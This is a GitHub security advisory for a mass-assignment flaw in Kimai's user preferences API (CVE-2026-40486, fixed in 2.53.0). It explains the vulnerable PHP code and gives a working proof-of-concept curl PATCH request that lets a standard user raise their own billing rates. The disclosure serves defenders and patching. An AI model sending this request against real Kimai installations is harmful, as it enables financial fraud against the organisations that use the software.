# [M] Kimai's User Preferences API allows standard users to modify restricted attributes: hourly_rate, internal_rate

## Summary
Severity: Medium
Advisory: GHSA-qh43-xrjm-4ggp
CVE: CVE-2026-40486
CWE: CWE-915
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-04-15
Source: https://github.com/advisories/GHSA-qh43-xrjm-4ggp
Type: github-advisory

## Affected
- Packagist: `kimai/kimai` — affected >=0 <2.53.0

## Details
### Summary
A Mass Assignment / Broken Object Property Level Authorization (BOPA) vulnerability in the User Preferences API allows any authenticated user (even those with the lowest privileges) to arbitrarily modify restricted financial attributes on their profile, specifically their `hourly_rate` and `internal_rate`.

### Details
Kimai restrictively protects the `hourly_rate` and `internal_rate` parameters during standard GUI flow. Users lacking the `hourly-rate` role permissions cannot see or edit these fields via the standard Web Form (`UserApiEditForm` / `UserEditType`). 

The vulnerability exists in the dedicated preferences API endpoint: `src/API/UserController.php::updateUserPreference`.

When a `PATCH` request is sent to `/api/users/{id}/preferences`, the endpoint iterates through the submitted JSON array and blindly applies the new values:
```php
foreach ($request->request->all() as $preference) {
    // ... validation omitted ...
    if (null === ($meta = $profile->getPreference($name))) {
        throw $this->createNotFoundException(\sprintf('Unknown custom-field "%s" requested', $name));
    }

    $meta->setValue($value); // <-- VULNERABILITY
}
```

The underlying Role-Based Access Control logic (`UserPreferenceSubscriber::getDefaultPreferences`) accurately identifies that standard users lack the `hourly-rate` role, and flags the dynamically generated preference object as disabled (`$preference->setEnabled(false)`). 

However, the `updateUserPreference` API endpoint entirely ignores this `isEnabled()` flag and forcefully saves the mutated object to the database natively via Doctrine ORM. This allows unauthorized accounts to manipulate the business-logic variables calculating their own financial earnings.

### PoC
1. Log into Kimai as an unprivileged, standard employee account (a user with absolutely no `roles` array privileges). 
2. Capture the `cookie` or Session cookies. (In this example, the user's ID is `2`).
3. Send the following cURL request (or intercept via Burp Suite) targeting your own user ID:

```bash
curl -i -X PATCH "http://localhost:8001/api/users/2/preferences" \
  -H "Content-Type: application/json" \
  -H "cookie: <YOUR_STANDARD_USER_TOKEN>" \
  -d '[
  {
    "name": "hourly_rate",
    "value": "1337"
  },
  {
    "name": "internal_rate",
    "value": "1337"
  }
]'
```

4. The server responds with `HTTP/1.1 200 OK`. (Note: The `hourly_rate` will intentionally NOT appear in the JSON echo due to `User::getVisiblePreferences` sanitizing output based on the same disabled flag).
5. If an Administrator organically views User 2's profile within Kimai, or if the user logs any new timesheets, the active and billed `hourly_rate` applied to their account will be confirmed as `1337`.
<img width="1542" height="1039" alt="user_account" src="https://github.com/user-attachments/assets/fff5e2da-d598-408d-8a01-784499ade844" />
<img width="1539" height="1037" alt="admin_account" src="https://github.com/user-attachments/assets/86a6e8c3-a97f-4be3-9f9f-2e23fad1d8a0" />

### Impact
This is a Privilege Escalation and Business Logic Flaw impacting the core financial calculations of the application. An attacker with a standard user account can manipulate their own billing rate multipliers unbeknownst to administrators, resulting in fraudulent invoices, distorted timesheet exports, and unauthorized financial tampering.

## References
- https://github.com/kimai/kimai/security/advisories/GHSA-qh43-xrjm-4ggp
- https://nvd.nist.gov/vuln/detail/CVE-2026-40486
- https://github.com/kimai/kimai
- https://github.com/kimai/kimai/releases/tag/2.53.0
